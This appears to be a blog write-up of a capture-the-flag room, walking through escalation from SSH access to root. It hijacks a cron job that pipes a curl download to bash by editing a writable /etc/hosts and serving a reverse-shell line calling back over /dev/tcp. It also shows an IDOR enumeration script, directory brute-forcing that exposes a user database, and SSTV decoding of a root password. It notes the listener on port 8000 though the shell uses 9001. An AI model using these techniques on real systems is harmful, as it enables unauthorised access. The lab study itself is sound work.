---
layout: post
author: d3r3lict
tags: [CTF, SSTV, IDOR, etc]
---
# Bob-Boba
First of all we need to add the target into hosts file.
We have SSH credentials, so let's log in and see what we can do.
When I checked crontab I found the following.
```
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```
So let's get a shell of bob-boba. But can we edit /etc/hosts?
```
$ ls -l /etc/hosts
-rw-rw-rw- 1 root adm 312 Apr  8  2023 /etc/hosts
```
Great, we can!
That means we can force the `target machine` to identify `attacker machine` as `cherryontop.tld`, so we can put a payload into `coinflip.sh`.
```
echo "MACHINE_IP cherryontop.tld" >> /etc/hosts
```
After this I've made exactly the same directory tree and put `coinflip.sh` there, so it looks like `/home/kali/Desktop/nanocherryctf/home/bob-boba/coinflip.sh`.
Now we can inject a revshell payload into that `.sh` file and run our listener in `/home/kali/Desktop/nanocherryctf/` directory.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "sh -i >& /dev/tcp/MACHINE_IP/9001 0>&1" > nanocherryctf/home/bob-boba/coinflip.sh
```
```
┌──(kali㉿kali)-[~/Desktop/nanocherryctf]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now we can start a listener on port 8000 and wait for a shell.
After a while I've got a shell, and got a part of `Chad Cherry's` password.

# Molly-Milk / WEB
After doing some enumeration using linpeas I found this.
```
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName nano.cherryontop.thm
        ServerAlias nano.cherryontop.thm
        DocumentRoot /var/www/b.cherryontop.thm
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
So there is an `nano` subdomain, huh? 
Let's see what's there. Add that subdomain into /etc/hosts and visit that website.
This one took a lot of time, but after adding .db in desired extensions for `dirbuster` I saw this.
```
File found: /users.db - 200
```
Let's download that file and see what's in there. There we can find credentials of admin page on the same website.
Get into admin panel and claim the second answer. There we can even find Molly's SSH password, and from there we can find another part of Chad Cherry's password.

# Sam-Sprinkles
This one took even more time.
There is a page which tells us some facts about ice cream. Let's take a look at it.
Here it is `http://cherryontop.thm/content.php?facts=1&user=I52WK43U`.
I was trying to find an SQL injection or LFI, but I couldn't. So maybe an IDOR? 
Let's write a simple python script to check that, it says `dontbeascriptkiddie`, right?

Here is the script
```
import requests

url="http://cherryontop.thm/content.php?facts={}&user=I52WK43U"

for i in range(1,1000):
        response = requests.get(url=url.format(i))
        if "<b>" in response.text:
                print(i)
```

Woah, looks like we found something?
```
┌──(kali㉿kali)-[~]
└─$ python3 script.py
1
2
3
4
20
43
50
64
```
Not really, it says 'no easter eggs for `you`', also it asks who we are. I've analysed the string `I52WK43U` using cyberchef, and found out that it is Base32 encoded string `Guest`. We hacked everyone except Sam and Chad, and in order to hack Chad we should hack Sam first. So obviously we are targeting Sam right now, right?
I modified the link in my code a lil bit, so now parameter `user` contains Base32 encoded string of Sam's username.
```
┌──(kali㉿kali)-[~]
└─$ python3 script.py
1
2
3
4
20
43
50
64
```
There is no changes???
Well, I wouldn't add this part in my writeup if it was useless :)
While checking these facts we can find Sam's SSH credentials.

# Chad-Cherry
I've claimed the last part of Chad's password and logged in as Chad-Cherry!
`Hello.txt` file says we will get the root password from .wav file, so let's get that file to our machine and look what we can do to it.

# Root
The first guess of mine is `Audio Steganography`, so I installed `Audacity` to find out. Well, not really.
Let me be honest, this one was something I couldn't solve, so I checked another writeup. (Shoutout kumarjitdron69)
It contains [SSTV][sstv-information] signal, and we need [This tool][sstv-tool] to extract the data.

```
$ git clone https://github.com/colaclanth/sstv.git
$ python setup.py install
```
Then we can extract the image from the audio using    
```
$ sstv -d rootPassword.raw -o image.jpg
```
And finally log in as root. And get the last answer :)

It was an amazing room with an amazing story. I'm really impressed on how much effort and time they put into it, because it was interesting, challenging, and funny. Many thanks to everyone who was participating in creation of this room <3

[sstv-tool]: https://github.com/colaclanth/sstv
[sstv-information]: https://en.wikipedia.org/wiki/Slow-scan_television

